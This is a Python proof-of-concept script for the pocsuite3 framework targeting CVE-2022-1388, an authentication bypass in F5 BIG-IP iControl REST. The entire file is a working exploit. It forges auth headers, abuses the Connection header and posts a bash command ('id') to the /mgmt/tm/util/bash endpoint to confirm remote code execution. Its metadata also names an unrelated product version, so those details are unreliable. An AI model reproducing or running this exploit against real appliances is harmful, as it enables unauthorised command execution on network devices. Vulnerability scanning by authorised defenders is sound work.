from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json


class DemoPOC(POCBase):
	vulID = '001'  # ssvid
	version = '1.0'
	name = 'CVE-2022-1388 F5-BIGIP iControl REST绕过授权访问漏洞'
	appName = ''
	appVersion = 'Payara Micro Community 5.2021.6'
	vulType = VUL_TYPE.CODE_EXECUTION
	desc = '''CVE-2022-1388 F5-BIGIP iControl REST绕过授权访问漏洞'''
	samples = []
	install_requires = ['']
	category = POC_CATEGORY.EXPLOITS.WEBAPP
	def _verify(self):
		result = {}
		headers = {
			'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
			'X-F5-Auth-Token': 'asdf',
			'Connection': 'X-F5-Auth-Token',
			'Content-Type': 'application/json'
		}
		try:
			target = self.url + "/mgmt/tm/util/bash"
			json_data = {"command": "run", "utilCmdArgs": "-c 'id'"}
			r = requests.post(url=target, headers=headers, json=json.dumps(json_data), verify=False, timeout=5)
			r.raise_for_status()
			if r.status_code == 200 and re.search('commandResult', r.text) and re.search('tm:util:bash:runstate',r.text):
				result['VerifyInfo'] = {}
				result['VerifyInfo']['URL'] = target
				return self.parse_verify(result)
		except:
			return
	def parse_verify(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output
register_poc(DemoPOC)
